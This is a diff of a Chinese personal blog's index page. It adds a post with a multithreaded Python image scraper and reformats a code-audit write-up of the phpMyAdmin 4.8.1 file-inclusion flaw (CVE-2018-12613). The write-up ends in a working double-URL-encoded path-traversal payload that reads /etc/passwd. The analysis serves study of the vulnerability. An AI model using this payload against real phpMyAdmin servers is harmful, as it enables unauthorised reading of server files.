@@ -253,6 +253,191 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://da4er.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da4er's">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da4er's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html" itemprop="url">多线程爬取表情包</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-23T19:01:54+08:00">
+                2020-02-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%88%AC%E8%99%AB/" itemprop="url" rel="index">
+                    <span itemprop="name">爬虫</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html" class="leancloud_visitors" data-flag-title="多线程爬取表情包">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  373
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>通过threading库加上queue的安全队列进行了一次对表情包网的爬出。</strong><br>代码如下：<br>使用了消费者和生产者的多线程爬虫。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">from urllib import request</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">class Producer(threading.Thread):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    def __init__ (self, page_queue,  img_queue, *args, **kwargs):</span><br><span class="line">        super(Producer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.image_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            url &#x3D; self.page_queue.get()</span><br><span class="line">            self.spider(url)</span><br><span class="line">    def spider(self, url):</span><br><span class="line">        resp &#x3D; requests.get(url, headers&#x3D;self.headers)</span><br><span class="line">        text &#x3D; resp.text</span><br><span class="line">        html &#x3D; etree.HTML(text)</span><br><span class="line">        imgs &#x3D; html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;page-content text-center&#39;]&#x2F;&#x2F;img[@class!&#x3D;&#39;gif&#39;]&quot;)</span><br><span class="line">        for i in imgs:</span><br><span class="line">            img &#x3D; i.get(&#39;data-original&#39;)</span><br><span class="line">            suffix &#x3D; os.path.splitext(img)[1]</span><br><span class="line">            alt &#x3D; i.get(&#39;alt&#39;)</span><br><span class="line">            alt &#x3D; re.sub(r&#39;[\?\.？。，,!！\*]&#39;, &#39;&#39;, alt)</span><br><span class="line">            filename &#x3D; alt + suffix</span><br><span class="line">            print(&#39;&#x2F;images&#x2F;%s&#39; %filename)</span><br><span class="line">            self.image_queue.put((img, filename))</span><br><span class="line">class Consumer(threading.Thread):</span><br><span class="line">    def __init__(self,page_queue,img_queue,*args,**kwargs):</span><br><span class="line">        super(Consumer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.img_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty() and self.img_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            img_url,filename&#x3D;self.img_queue.get()</span><br><span class="line">            request.urlretrieve(img_url,&quot;images&#x2F;&quot;+filename)</span><br><span class="line">            print(filename+&quot;  下载完成！&quot;)</span><br><span class="line">def main():</span><br><span class="line">    page_queue &#x3D; Queue(100)</span><br><span class="line">    img_queue &#x3D; Queue(1000)</span><br><span class="line">    base_url &#x3D; &quot;http:&#x2F;&#x2F;www.doutula.com&#x2F;photo&#x2F;list&#x2F;?page&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(1, 101):</span><br><span class="line">        url &#x3D; base_url.format(i)</span><br><span class="line">        page_queue.put(url)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        t&#x3D;Producer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">    for i in  range(5):</span><br><span class="line">        t&#x3D;Consumer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://da4er.top/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -349,7 +534,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  674
+                  676
                 </span>
               
 
@@ -388,10 +573,23 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br>漏洞影响范围：phpmyadmin4.8.0 4.8.1<br>漏洞类型：后台任意文件包含<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">下载地址</a></p>
-<p>漏洞出现在index.php页面中的55~63行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。</p>
-<p>看一下$target_blacklist：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist &#x3D; array (</span><br><span class="line">    &#39;import.php&#39;, &#39;export.php&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><br>追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array </span><br><span class="line">$whitelist &#x3D; [])</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">       if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">       if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">        &#39; db_datadict.php&#39;,</span><br><span class="line">        &#39;db_sql.php&#39;,</span><br><span class="line">        &#39;db_events.php&#39;,</span><br><span class="line">        &#39;db_export.php&#39;,</span><br><span class="line">        &#39;db_importdocsql.php&#39;,</span><br><span class="line">        &#39;db_multi_table_query.php&#39;,</span><br><span class="line">        &#39;db_structure.php&#39;,</span><br><span class="line">        &#39;db_import.php&#39;,</span><br><span class="line">        &#39;db_operations.php&#39;,</span><br><span class="line">        &#39;db_search.php&#39;,</span><br><span class="line">        &#39;db_routines.php&#39;,</span><br><span class="line">        &#39;export.php&#39;,</span><br><span class="line">        &#39;import.php&#39;,</span><br><span class="line">        &#39;index.php&#39;,</span><br><span class="line">        &#39;pdf_pages.php&#39;,</span><br><span class="line">        &#39;pdf_schema.php&#39;,</span><br><span class="line">        &#39;server_binlog.php&#39;,</span><br><span class="line">        &#39;server_collations.php&#39;,</span><br><span class="line">        &#39;server_databases.php&#39;,</span><br><span class="line">        &#39;server_engines.php&#39;,</span><br><span class="line">        &#39;server_export.php&#39;,</span><br><span class="line">        &#39;server_import.php&#39;,</span><br><span class="line">        &#39;server_privileges.php&#39;,</span><br><span class="line">        &#39;server_sql.php&#39;,</span><br><span class="line">        &#39;server_status.php&#39;,</span><br><span class="line">        &#39;server_status_advisor.php&#39;,</span><br><span class="line">        &#39;server_status_monitor.php&#39;,</span><br><span class="line">        &#39;server_status_queries.php&#39;,</span><br><span class="line">        &#39;server_status_variables.php&#39;,</span><br><span class="line">        &#39;server_variables.php&#39;,</span><br><span class="line">        &#39;sql.php&#39;,</span><br><span class="line">        &#39;tbl_addfield.php&#39;,</span><br><span class="line">        &#39;tbl_change.php&#39;,</span><br><span class="line">        &#39;tbl_create.php&#39;,</span><br><span class="line">        &#39;tbl_import.php&#39;,</span><br><span class="line">        &#39;tbl_indexes.php&#39;,</span><br><span class="line">        &#39;tbl_sql.php&#39;,</span><br><span class="line">        &#39;tbl_export.php&#39;,</span><br><span class="line">        &#39;tbl_operations.php&#39;,</span><br><span class="line">        &#39;tbl_structure.php&#39;,</span><br><span class="line">        &#39;tbl_relation.php&#39;,</span><br><span class="line">        &#39;tbl_replace.php&#39;,</span><br><span class="line">        &#39;tbl_row_action.php&#39;,</span><br><span class="line">        &#39;tbl_select.php&#39;,</span><br><span class="line">        &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">        &#39;transformation_overview.php&#39;,</span><br><span class="line">        &#39;transformation_wrapper.php&#39;,</span><br><span class="line">        &#39;user_password.php&#39;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><br>看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。<br>看一下这段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。<br>根据我们上面的分析很容易写出payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><br>我试了不url编码?的payload，但是没有成功。<br>最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：<br><img src="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/1.png" class title="Da4er"></p>
-
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p>漏洞影响范围：phpmyadmin4.8.0 4.8.1<br>漏洞类型：后台任意文件包含<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">下载地址</a></p>
+<p>漏洞出现在index.php页面中的55~63行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。</p>
+<p>看一下$target_blacklist：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist &#x3D; array (</span><br><span class="line">    &#39;import.php&#39;, &#39;export.php&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array </span><br><span class="line">$whitelist &#x3D; [])</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">       if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">       if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">        &#39; db_datadict.php&#39;,</span><br><span class="line">        &#39;db_sql.php&#39;,</span><br><span class="line">        &#39;db_events.php&#39;,</span><br><span class="line">        &#39;db_export.php&#39;,</span><br><span class="line">        &#39;db_importdocsql.php&#39;,</span><br><span class="line">        &#39;db_multi_table_query.php&#39;,</span><br><span class="line">        &#39;db_structure.php&#39;,</span><br><span class="line">        &#39;db_import.php&#39;,</span><br><span class="line">        &#39;db_operations.php&#39;,</span><br><span class="line">        &#39;db_search.php&#39;,</span><br><span class="line">        &#39;db_routines.php&#39;,</span><br><span class="line">        &#39;export.php&#39;,</span><br><span class="line">        &#39;import.php&#39;,</span><br><span class="line">        &#39;index.php&#39;,</span><br><span class="line">        &#39;pdf_pages.php&#39;,</span><br><span class="line">        &#39;pdf_schema.php&#39;,</span><br><span class="line">        &#39;server_binlog.php&#39;,</span><br><span class="line">        &#39;server_collations.php&#39;,</span><br><span class="line">        &#39;server_databases.php&#39;,</span><br><span class="line">        &#39;server_engines.php&#39;,</span><br><span class="line">        &#39;server_export.php&#39;,</span><br><span class="line">        &#39;server_import.php&#39;,</span><br><span class="line">        &#39;server_privileges.php&#39;,</span><br><span class="line">        &#39;server_sql.php&#39;,</span><br><span class="line">        &#39;server_status.php&#39;,</span><br><span class="line">        &#39;server_status_advisor.php&#39;,</span><br><span class="line">        &#39;server_status_monitor.php&#39;,</span><br><span class="line">        &#39;server_status_queries.php&#39;,</span><br><span class="line">        &#39;server_status_variables.php&#39;,</span><br><span class="line">        &#39;server_variables.php&#39;,</span><br><span class="line">        &#39;sql.php&#39;,</span><br><span class="line">        &#39;tbl_addfield.php&#39;,</span><br><span class="line">        &#39;tbl_change.php&#39;,</span><br><span class="line">        &#39;tbl_create.php&#39;,</span><br><span class="line">        &#39;tbl_import.php&#39;,</span><br><span class="line">        &#39;tbl_indexes.php&#39;,</span><br><span class="line">        &#39;tbl_sql.php&#39;,</span><br><span class="line">        &#39;tbl_export.php&#39;,</span><br><span class="line">        &#39;tbl_operations.php&#39;,</span><br><span class="line">        &#39;tbl_structure.php&#39;,</span><br><span class="line">        &#39;tbl_relation.php&#39;,</span><br><span class="line">        &#39;tbl_replace.php&#39;,</span><br><span class="line">        &#39;tbl_row_action.php&#39;,</span><br><span class="line">        &#39;tbl_select.php&#39;,</span><br><span class="line">        &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">        &#39;transformation_overview.php&#39;,</span><br><span class="line">        &#39;transformation_wrapper.php&#39;,</span><br><span class="line">        &#39;user_password.php&#39;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+<p>看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。<br>看一下这段代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。<br>根据我们上面的分析很容易写出payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>我试了不url编码?的payload，但是没有成功。<br>最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：</p>
+<img src="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/1.png" class title="Da4er">
           
         
       
@@ -574,11 +772,25 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
